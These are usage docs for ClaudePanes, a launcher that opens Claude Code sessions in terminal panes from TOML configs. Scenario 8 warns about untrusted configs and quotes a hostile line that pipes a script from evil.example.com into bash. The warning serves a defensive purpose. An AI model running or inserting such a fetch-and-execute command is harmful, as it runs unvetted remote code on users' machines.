# ClaudePanes Usage Examples

Real-world scenarios with paste-ready TOML configs and the exact `claude-panes` command to launch them. Each example is intended to be copy-pasted, saved under `~/.config/claude-panes/layouts/` (or any path you pass to `claude-panes start`), and run as-is or adapted to your worktree paths.

ClaudePanes is a zero-dependency, single-file Python launcher (Python 3.11+, stdlib only). It reads a TOML layout config and opens the requested pane layout in whichever terminal multiplexer is installed: Windows Terminal (`wt.exe`), WezTerm, tmux, or Zellij. Its headline use case is launching parallel Claude Code sessions across git worktrees on Windows 11, each running inside WSL2 so that Claude's `/sandbox` slash command can isolate file system access.

A note that applies to every scenario below: `/sandbox` is a slash command **inside** a Claude Code session running in WSL. ClaudePanes does not pass a `--sandbox` flag; it just launches Claude in the right place. Once Claude is up, the user types `/sandbox` themselves if they want it.

---

## Scenario 1: Single Claude Code session in WSL with /sandbox

The simplest case. One pane, one Claude, running inside WSL so that `/sandbox` works correctly. Use this as your starting template before you grow into multi-pane layouts.

**Why use this:** You want one Claude session, you want filesystem isolation via `/sandbox`, and you do not want to remember the WSL invocation by hand each time.

**Config** — save as `~/.config/claude-panes/layouts/solo.toml`:

```toml
# ~/.config/claude-panes/layouts/solo.toml
name = "solo"
description = "Single Claude session in WSL"

[[panes]]
cmd = "wsl -d Ubuntu-22.04 -- bash -lc 'cd ~/work && claude'"
title = "Claude"
```

**Launch:**

```
claude-panes start solo
```

**Layout:**

```
+-----------------------------------+
|                                   |
|             Claude                |
|                                   |
+-----------------------------------+
```

Once the pane is up, run `/sandbox` inside Claude to enable sandboxing. ClaudePanes does not pass a `--sandbox` flag; sandboxing is opt-in per session and controlled by Claude itself.

---

## Scenario 2: Claude + git watcher side-by-side

A common dev pattern: Claude on the left doing the work, `watch git status -sb` on the right so you can see file changes appear in real time as Claude edits.

**Why use this:** You want passive visibility into what Claude is changing without alt-tabbing to another terminal or IDE. The narrow git pane stays out of the way but is glanceable.

**Config** — save as `~/.config/claude-panes/layouts/claude-with-git.toml`:

```toml
name = "claude-with-git"
description = "Claude session with a git status watcher on the side"

[[panes]]
cmd = "wsl -- bash -lc 'cd ~/work/feature-x && claude'"
title = "Claude"

[[panes]]
cmd = "wsl -- bash -lc 'cd ~/work/feature-x && watch -n 2 git status -sb'"
split = "vertical"
size = 0.3
title = "git watch"
```

**Launch:**

```
claude-panes start claude-with-git
```

**Layout:**

```
+-------------------+------------+
|                   |            |
|   Claude          | git status |
|                   |  (watch)   |
|                   |            |
+-------------------+------------+
```

`size = 0.3` means the git pane takes 30 percent of the horizontal space. `split = "vertical"` means the new pane appears to the right of the previous one (the split runs vertically down the screen).

---

## Scenario 3: Three parallel worktrees, one per tab

The headline use case. You have three independent pieces of work happening in three git worktrees, you want a Claude session on each one, and you want to flip between them with `Ctrl+Tab`.

**Why use this:** Parallelism is the entire reason ClaudePanes exists. Three Claude sessions can each chew on a long-running task while you supervise from whichever tab is in focus. No risk of cross-contamination because each session runs in its own worktree directory.

**Config** — save as `~/.config/claude-panes/layouts/parallel-three.toml`:

```toml
name = "parallel-three"
description = "Three Claude sessions, one per worktree, each in its own tab"
terminal = "wt"

[[tabs]]
title = "Auth refactor"
[[tabs.panes]]
cmd = "wsl -- bash -lc 'cd ~/work/auth-refactor && claude'"

[[tabs]]
title = "Payment bug"
[[tabs.panes]]
cmd = "wsl -- bash -lc 'cd ~/work/payment-bug && claude'"

[[tabs]]
title = "Migration"
[[tabs.panes]]
cmd = "wsl -- bash -lc 'cd ~/work/migration && claude'"
```

**Launch:**

```
claude-panes start parallel-three
```

**Layout (Windows Terminal tab strip):**

```
+-----------------+-----------------+-----------------+
| Auth refactor   | Payment bug     | Migration       |
+-----------------+-----------------+-----------------+
|                                                     |
|                   (active tab)                      |
|                                                     |
+-----------------------------------------------------+
```

**Navigation:**

- `Ctrl+Tab` cycles forward through tabs.
- `Ctrl+Shift+Tab` cycles backward.
- `Ctrl+Alt+1` / `2` / `3` jumps directly to tab 1, 2, or 3.

The `terminal = "wt"` line pins this layout to Windows Terminal because tabs are a Windows Terminal concept the way ClaudePanes uses them. On macOS or Linux, tmux windows fill the same role and ClaudePanes will translate accordingly (see Scenario 6).

---

## Scenario 4: Full IDE-like setup — Claude, file watcher, dev server, terminal

A heavier layout: four panes in one tab. Claude takes half the screen on the left; the right half is split horizontally into git status (top), dev server (middle), and a free terminal (bottom). Useful when one task needs a full workstation and you do not want to switch windows.

**Why use this:** Long-running feature work where you want Claude, a quick git glance, the running dev server's logs, and a free shell for ad-hoc commands, all in one viewport.

**Config** — save as `~/.config/claude-panes/layouts/ide.toml`:

```toml
name = "ide"
description = "Full IDE-like layout: Claude + git + dev server + free shell"

[[panes]]
cmd = "wsl -- bash -lc 'cd ~/work/feature-x && claude'"
title = "Claude"

[[panes]]
cmd = "wsl -- bash -lc 'cd ~/work/feature-x && git status -sb && echo --- && git log --oneline -10'"
split = "vertical"
size = 0.5
title = "git"

[[panes]]
cmd = "wsl -- bash -lc 'cd ~/work/feature-x && npm run dev'"
split = "horizontal"
size = 0.5
parent = 1
title = "dev"

[[panes]]
cmd = "wsl -- bash -lc 'cd ~/work/feature-x && exec bash'"
split = "horizontal"
size = 0.5
parent = 2
title = "shell"
```

**Launch:**

```
claude-panes start ide
```

**Layout (approximate; tile order depends on terminal):**

```
+-----------------------+-----------------+
|                       |  git status     |
|                       +-----------------+
|       Claude          |  dev server     |
|                       +-----------------+
|                       |  free terminal  |
+-----------------------+-----------------+
```

**How the `parent` field works:** Panes are indexed by position in the file starting at 0. Pane 0 is Claude. Pane 1 is git (split off pane 0, vertical). Pane 2 is dev (split off pane 1, horizontal, so it lands below git). Pane 3 is shell (split off pane 2, horizontal, so it lands below dev). Without `parent`, every split would target the most recently created pane and you would get a different shape.

---

## Scenario 5: Native Windows (no WSL) — for projects that don't need /sandbox

If you are working on a pure-Windows project (a .NET service, a PowerShell module, something that does not benefit from a Linux filesystem) and you do not need `/sandbox`, run Claude directly in PowerShell. Skipping WSL saves a couple of seconds of startup and avoids `\\wsl$\` path quirks.

**Why use this:** Native Windows projects, or projects where `/sandbox` is not worth the WSL hop.

**Config (escaped backslashes form)** — save as `~/.config/claude-panes/layouts/native-windows.toml`:

```toml
name = "native-windows"
description = "Claude in PowerShell, no WSL"

[[panes]]
cmd = "powershell -NoLogo -NoExit -Command \"cd 'C:\\Users\\Me\\work\\project'; claude\""
title = "Claude"
```

**Config (TOML literal string form)** — equivalent, often easier to read:

```toml
name = "native-windows"
description = "Claude in PowerShell, no WSL"

[[panes]]
cmd = 'powershell -NoLogo -NoExit -Command "cd ''C:\Users\Me\work\project''; claude"'
title = "Claude"
```

**Launch:**

```
claude-panes start native-windows
```

**Quoting guidance:** Prefer the literal-string form (single-quoted in TOML, `'...'`). TOML literal strings do not process escapes, so backslashes in Windows paths stay as-is and you only have to worry about TOML's own quoting rules. The double-quoted form requires you to escape every backslash (`\\`), which is easy to get wrong, especially when the same string also contains nested quotes for PowerShell. Save the double-quoted form for cases where you genuinely need an escape sequence like `\n` or `\t` inside the command.

**Note on `\\` doubling:** In the escaped form above, `\\Users\\Me\\work\\project` is a single backslash four times over, because TOML uses `\\` to mean a literal `\` in basic (double-quoted) strings. In the literal form, `\Users\Me\work\project` is exactly what it looks like.

---

## Scenario 6: Cross-platform — same config on macOS via tmux

Most pane configs can be made portable by avoiding Windows-only commands. ClaudePanes auto-detects the available terminal at launch: if you are on macOS or Linux and tmux is installed, it will translate the same TOML into a tmux session.

**Why use this:** You share a config with a teammate, or you carry the same setup between Windows (Windows Terminal + WSL) and macOS (tmux). Less duplication, fewer "works on my machine" moments.

**Config** — save as `~/.config/claude-panes/layouts/feature-x.toml`:

```toml
name = "feature-x"
description = "Claude + git watch; portable across Windows Terminal and tmux"

# Same shape as Scenario 2; works because the cmd uses /bin/bash semantics
[[panes]]
cmd = "bash -lc 'cd ~/work/feature-x && claude'"
title = "Claude"

[[panes]]
cmd = "bash -lc 'cd ~/work/feature-x && watch -n 2 git status -sb'"
split = "vertical"
size = 0.3
title = "git watch"
```

**Launch (macOS):**

```
claude-panes start feature-x
```

ClaudePanes detects `tmux` and emits the tmux command shape (e.g. `tmux new-session -d -s feature-x ...` followed by `split-window` calls). The TOML stays the same.

**Layout:**

```
+-------------------+------------+
|                   |            |
|   Claude          | git status |
|                   |  (watch)   |
|                   |            |
+-------------------+------------+
```

**Note on portability:** Cross-platform configs avoid Windows-only commands like `wsl` and stick to commands that exist in the target shell. If a config must use `wsl`, it is no longer portable. Convention for naming: append a platform hint to the filename, e.g. `feature-x.windows.toml` and `feature-x.macos.toml`. ClaudePanes does not enforce this naming, but it makes the constraint obvious to anyone reading the directory.

---

## Scenario 7: Dry-run before commit

You are about to share a layout config in a PR. Before merging, verify it renders the way you expect under each terminal adapter, without actually opening anything. `--dry-run` prints the commands ClaudePanes would execute and exits.

**Why use this:** Catch quoting mistakes, wrong pane order, or unsupported features before your teammate tries to run it.

**Run on Windows Terminal:**

```
$ claude-panes start shared-layout --dry-run --terminal wt

[wt adapter] Would execute:
  wt.exe new-tab --title "Shared Layout" wsl.exe -d Ubuntu -- bash -lc "cd ~/work && claude"
  wt.exe split-pane --vertical --size 0.3 wsl.exe -d Ubuntu -- bash -lc "cd ~/work && watch -n 2 git status -sb"
```

**Run on tmux:**

```
$ claude-panes start shared-layout --dry-run --terminal tmux

[tmux adapter] Would execute:
  tmux new-session -d -s shared-layout -n "Shared Layout" "bash -lc 'cd ~/work && claude'"
  tmux split-window -h -t shared-layout -p 30 "bash -lc 'cd ~/work && watch -n 2 git status -sb'"
```

**Exit code:** `0` if the config is valid and the adapter could render it. Non-zero with a clear error if not. Suitable for CI.

---

## Scenario 8: Validate a config from an untrusted source

Someone posted a TOML in a Slack message. It looks helpful. You want to run it. **Stop.** A TOML config is a list of shell commands ClaudePanes will execute on your behalf, with your credentials, in your shell. A malicious config is indistinguishable from a normal one to ClaudePanes — both are just strings.

**Why use this:** Defensive habit. Same instinct as not piping `curl | bash` from an unfamiliar URL.

**Validate the structure:**

```
$ claude-panes validate ./random-config.toml
OK: random-config
```

`validate` confirms the TOML parses, required keys are present, and pane references are consistent. It does **not** vet the `cmd` strings — they could do anything.

**Inspect the cmd lines yourself:**

```
$ grep '^cmd' ./random-config.toml
cmd = "wsl -- bash -lc 'curl evil.example.com/script.sh | bash'"   # <-- nope
```

If any `cmd` pipes a network fetch into a shell, downloads a binary from a URL you do not recognize, writes to paths outside the worktree, sets `IFS` or unusual environment variables, or invokes `sudo`, treat the config as hostile and delete it.

**Audit checklist:** See `security.md` for the full review steps before running a config from outside your own machine.

---

## Scenario 9: Working with the user's existing aliases

You have aliases in your shell rc files: `alias work-x='cd ~/work/feature-x && code .'`, helper functions, `direnv` hooks, the works. By default a login shell loaded with `bash -lc` reads `~/.bash_profile` (or `~/.profile`) but **not** `~/.bashrc`, which is where most people put aliases. To pick up aliases, the shell needs to be **interactive** as well.

**Why use this:** You want your TOML to call shortcuts you have already defined elsewhere instead of inlining the long form into every pane config.

**Config:**

```toml
[[panes]]
cmd = "wsl -- bash -ilc 'work-x && claude'"
title = "Claude (with alias)"
```

The flags are `-i` (interactive) and `-l` (login), in either order. `-i` is what makes bash source `~/.bashrc` and pick up your aliases.

**Trade-off:** Interactive shells are noticeably slower to start. On a cold WSL boot, `bash -ilc` can take an extra 200-800ms over `bash -lc` depending on what `.bashrc` does (`nvm`, `pyenv`, prompt setup, plugin managers all add up). For a single-pane scenario this is invisible; for a six-pane layout it stacks. If you are tuning for fast launches, prefer to inline the alias's body into the TOML and stick with `bash -lc`.

**Alternative without interactive shell:** Source the rc file explicitly so aliases load without paying the full interactive startup cost.

```toml
[[panes]]
cmd = "wsl -- bash -lc 'source ~/.bashrc && shopt -s expand_aliases && work-x && claude'"
title = "Claude"
```

`shopt -s expand_aliases` is required because bash disables alias expansion in non-interactive shells regardless of whether the rc file is sourced. This is faster than `-i` for layouts that launch many panes in parallel.

---

## Quick reference: common fields

| Field            | Type    | Default      | Meaning                                              |
|------------------|---------|--------------|------------------------------------------------------|
| `name`           | string  | filename     | Layout identifier shown in errors and dry-run output |
| `description`    | string  | empty        | Free-form note for humans                            |
| `terminal`       | string  | auto-detect  | Force a specific adapter (`wt`, `wezterm`, `tmux`, `zellij`) |
| `[[panes]]`      | array   | required     | Ordered list of panes within a single tab            |
| `[[tabs]]`       | array   | optional     | Group panes into tabs (Windows Terminal / tmux windows) |
| `cmd`            | string  | required     | Shell command to run in the pane                     |
| `title`          | string  | empty        | Tab or pane title                                    |
| `split`          | string  | `vertical`   | `vertical` (right) or `horizontal` (below)           |
| `size`           | float   | `0.5`        | Fraction of parent pane to give the new pane (0.0-1.0) |
| `parent`         | int     | previous     | Index of the pane to split (0-based)                 |

See `docs/config-format.md` for the full schema and edge cases.

---

## Putting it together

The recurring pattern across every scenario is: ClaudePanes is the launcher, your terminal multiplexer is the runtime, and Claude Code is the workload. ClaudePanes does not know what Claude is doing — it just opens panes in the right shapes, with the right working directories, in the right shell. Once a session is up, everything else (sandboxing, model selection, MCP servers, slash commands) is between you and Claude.

When in doubt, start with Scenario 1, get one pane working, then grow into multi-pane layouts. Use `--dry-run` whenever you change a config. Validate any config that did not come from your own machine.
